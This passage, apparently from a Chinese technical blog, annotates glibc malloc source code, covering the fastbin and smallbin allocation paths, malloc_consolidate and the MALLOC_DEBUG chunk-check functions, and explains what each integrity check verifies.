class="comment">/*</span></span><br><span class="line"><span class="comment">   通过添加SIZE_SZ字节的开销以及可能的额外开销，将请求大小转换为内部形式，以获得必要的对齐和/或至少为MINSIZE（最小可分配大小）的大小。同时，checked_request2size函数会检测并返回0，对于那些在填充和对齐后会导致溢出到零的请求大小。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">checked_request2size (bytes, nb);</span><br></pre></td></tr></table></figure><p>之后如果没有arena即没有分配区可用直接调用sysmalloc一个chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment"> mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="malloc-consolidate-整理堆块"><a href="#malloc-consolidate-整理堆块" class="headerlink" title="malloc_consolidate(整理堆块)"></a>malloc_consolidate(整理堆块)</h3><p><strong>总结</strong></p><ol><li><strong>若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步</strong></li><li><strong>从 fastbin 中获取一个空闲 chunk</strong></li><li><strong>尝试向后合并</strong></li><li><strong>若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步</strong></li><li><strong>否则尝试向前合并后，插入到 unsorted_bin 中</strong></li><li><strong>获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步</strong></li><li><strong>退出函数</strong></li></ol><h3 id="fastbin（FILO）"><a href="#fastbin（FILO）" class="headerlink" title="fastbin（FILO）"></a>fastbin（FILO）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim = pp;</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">         != victim);</span><br></pre></td></tr></table></figure><p>其中用到的原子操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gnewval = (newval);      \</span></span><br><span class="line"><span class="meta">      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure><p>就是比较mem指向的值是否等于oldval,如果等于则将mem指向的值变为newval,并返回oldval</p><p>如果victim不为NULL,检查其大小计算得出的索引是否符合当前索引链</p><p>最后有个检查调用<code>check_remalloced_chunk (av, victim, nb);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">        errout:</span><br><span class="line">          malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这个就是第一个检查，<strong>该fastbin的size要合法</strong></p><p>第二个检查就是<code>check_remalloced_chunk (av, victim, nb);</code>一般是空函数</p><p>其中的检查如下：</p><ul><li>保证x的size合法即可</li></ul><h3 id="do-check-remalloced-chunk"><a href="#do-check-remalloced-chunk" class="headerlink" title="do_check_remalloced_chunk"></a>do_check_remalloced_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_check_remalloced_chunk -&gt; do_check_inuse_chunk -&gt; do_check_chunk -&gt; do_check_free_chunk</span><br></pre></td></tr></table></figure><p>而下面的<code>do_check_remalloced_chunk</code>并不是这个因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MALLOC_DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_DEBUG 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>MALLOC_DEBUG&#x3D;0</p><p>而</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !MALLOC_DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)</span></span><br></pre></td></tr></table></figure><p>这个的先决条件便是要满足debug&#x3D;1所以我以下的分析都是多次一举</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));   <span class="comment">//确保内存块所属的堆区域正确</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);  <span class="comment">//进一步确定，一般只要标志位正确</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);  <span class="comment">//检查内存对齐</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);  <span class="comment">//检查size&gt;=minsize</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));   <span class="comment">//检查起始地址满足对齐条件</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);    <span class="comment">//检查要分配的size&gt;=要求的size</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);   <span class="comment">//检查要分配的size&lt;要求的size+minsize</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>do_check_inuse_chunk (av, p);</code>这个就对p进行更加细节的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_inuse_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr next;</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);  <span class="comment">//调用在下方</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">/* mmapped chunks have no next/prev */</span>  <span class="comment">//如果是mmap的heap直接退出检查</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check whether it claims to be in use ... */</span></span><br><span class="line">  assert (inuse (p));          <span class="comment">//通过p的地址+size来指向下一个chunk判断本chunk是否正在使用，如果为空闲则退出//fastbin的特性，释放但不置0</span></span><br><span class="line"></span><br><span class="line">  next = next_chunk (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ... and is surrounded by OK chunks.</span></span><br><span class="line"><span class="comment">     Since more things can be checked with free chunks than inuse ones,</span></span><br><span class="line"><span class="comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))   </span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);   <span class="comment">//如果前一个chunk为空闲块则检查其next_chunk是不是本chunk</span></span><br><span class="line">      do_check_free_chunk (av, prv);   <span class="comment">//调用在下方</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));  <span class="comment">//如果next为top则检查topchunk的pre位和size&gt;=minsize</span></span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))   <span class="comment">//如果下一个chunk为空闲块则调用检查</span></span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> sz = chunksize (p);</span><br><span class="line">  <span class="comment">/* min and max possible addresses assuming contiguous allocation */</span></span><br><span class="line">  <span class="type">char</span> *max_address = (<span class="type">char</span> *) (av-&gt;top) + chunksize (av-&gt;top);</span><br><span class="line">  <span class="type">char</span> *min_address = max_address - av-&gt;system_mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Has legal address ... */</span></span><br><span class="line">      <span class="keyword">if</span> (p != av-&gt;top)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">            &#123;</span><br><span class="line">              assert (((<span class="type">char</span> *) p) &gt;= min_address);</span><br><span class="line">              assert (((<span class="type">char</span> *) p + sz) &lt;= ((<span class="type">char</span> *) (av-&gt;top)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* top size is always at least MINSIZE */</span></span><br><span class="line">          assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">          <span class="comment">/* top predecessor always marked inuse */</span></span><br><span class="line">          assert (prev_inuse (p));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* address is outside main heap  */</span></span><br><span class="line">      <span class="keyword">if</span> (contiguous (av) &amp;&amp; av-&gt;top != initial_top (av))</span><br><span class="line">        &#123;</span><br><span class="line">          assert (((<span class="type">char</span> *) p) &lt; min_address || ((<span class="type">char</span> *) p) &gt;= max_address);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* chunk is page-aligned */</span></span><br><span class="line">      assert (((p-&gt;prev_size + sz) &amp; (GLRO (dl_pagesize) - <span class="number">1</span>)) == <span class="number">0</span>);</span><br><span class="line">      <span class="comment">/* mem is aligned */</span></span><br><span class="line">      assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin只需要注意<code>if (p != av-&gt;top)</code>这部分即可</p><ul><li>断言内存块的地址大于等于最小地址范围。</li><li>断言内存块的结束地址小于等于堆的顶部块的地址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_free_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">  mchunkptr next = chunk_at_offset (p, sz);</span><br><span class="line"></span><br><span class="line">  do_check_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Chunk must claim to be free ... */</span></span><br><span class="line">  assert (!inuse (p));   <span class="comment">//必须为空闲</span></span><br><span class="line">  assert (!chunk_is_mmapped (p));    <span class="comment">//必须为非mmap</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unless a special marker, must have OK fields */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">      assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);   <span class="comment">//内存块大小对齐</span></span><br><span class="line">      assert (aligned_OK (chunk2mem (p)));   <span class="comment">//内存对齐</span></span><br><span class="line">      <span class="comment">/* ... matching footer field */</span></span><br><span class="line">      assert (next-&gt;prev_size == sz);    <span class="comment">//next_chunk的pre_size==size</span></span><br><span class="line">      <span class="comment">/* ... and is fully consolidated */</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">//前一个chunk被标记为已使用</span></span><br><span class="line">      assert (next == av-&gt;top || inuse (next));     <span class="comment">//next_chunk为top或者next_chunk要为非空闲的</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ... and has minimally sane links */</span></span><br><span class="line">      assert (p-&gt;fd-&gt;bk == p);   <span class="comment">//fd和bk正常检查</span></span><br><span class="line">      assert (p-&gt;bk-&gt;fd == p);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="comment">/* markers are always of size SIZE_SZ */</span></span><br><span class="line">    assert (sz == SIZE_SZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MALLOC_DEBUG的作用是用于开发者在发现内存错误的时候，修改其值能够更快的定位错误</p><p>正常时候MALLOC_DEBUG&#x3D;0</p><h3 id="smallbin（FIFO）"><a href="#smallbin（FIFO）" class="headerlink" title="smallbin（FIFO）"></a>smallbin（FIFO）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">              <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);   <span class="comment">//设置pre位为1</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>符合smallbin的范围的话，就会判定</p><ul><li>如果链表不为空的话<ul><li>如果是由于未初始化导致的就调用<code>malloc_consolidate (av);</code></li><li>如果不是则取出</li></ul></li></ul><p>其中有着两个检查，第一个是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就要满足要分配的victim-&gt;bk-&gt;fd&#x3D;&#x3D;victim，而fd没有这个要求</p><p>第二个检查就是<code> check_malloced_chunk (av, victim, nb);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_malloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* same as recycled case ... */</span></span><br><span class="line">  do_check_remalloced_chunk (av, p, s);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     ... plus,  must obey implementation invariant that prev_inuse is</span></span><br><span class="line"><span class="comment">     always true of any allocated chunk; i.e., that each allocated</span></span><br><span class="line"><span class="comment">     chunk borders either a previously allocated and still in-use</span></span><br><span class="line"><span class="comment">     chunk, or the base of its memory arena. This is ensured</span></span><br><span class="line"><span class="comment">     by making all allocations from the `lowest&#x27; part of any found</span></span><br><span class="line"><span class="comment">     chunk.  This does not necessarily hold however for chunks</span></span><br><span class="line"><span class="comment">     recycled via fastbins.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   ... 另外，必须遵守实现不变式，即任何分配的内存块的prev_inuse始终为真；</span></span><br><span class="line"><span class="comment">   换句话说，每个分配的内存块要么与先前分配且仍在使用的内存块相邻，</span></span><br><span class="line"><span class="comment">   要么与其内存区域的基址相邻。通过从任何找到的内存块的“最低”部分进行所有分配，</span></span><br><span class="line"><span class="comment">   可以确保这一点。然而，通过快速链表回收的内存块不一定满足这个条件。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  assert (prev_inuse (p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中包含的<code>do_check_remalloc_chunk</code>在上面也有过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span 